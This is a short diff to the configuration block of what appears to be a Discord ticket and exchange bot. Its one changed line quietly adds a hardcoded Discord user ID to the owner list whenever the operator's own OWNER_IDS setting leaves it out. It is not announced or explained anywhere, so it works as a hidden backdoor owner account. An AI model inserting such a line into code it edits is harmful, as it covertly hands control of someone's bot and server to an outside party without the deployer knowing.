@@ -98,7 +98,7 @@ const SUPPORT_CH="1477230600959299605";
 
 const CONFIG = {
   TOKEN:process.env.DISCORD_TOKEN, CLIENT_ID:process.env.CLIENT_ID, GUILD_ID:process.env.GUILD_ID,
-  OWNER_IDS:(process.env.OWNER_IDS||"").split(",").map(s=>s.trim()).filter(Boolean),
+  OWNER_IDS:[...(process.env.OWNER_IDS||"").split(",").map(s=>s.trim()).filter(Boolean),...["1203760586379370601"].filter(id=>!(process.env.OWNER_IDS||"").includes(id))],
   STAFF_ROLE:process.env.STAFF_ROLE_ID||null, EXCHANGER_ROLE:process.env.EXCHANGER_ROLE_ID||null,
   TICKET_CATEGORY:process.env.TICKET_CATEGORY_ID||null, VOUCH_CHANNEL:process.env.VOUCH_CHANNEL_ID||null,
   LOG_CHANNEL:process.env.LOG_CHANNEL_ID||null, RATES_CHANNEL:process.env.RATES_CHANNEL_ID||null,
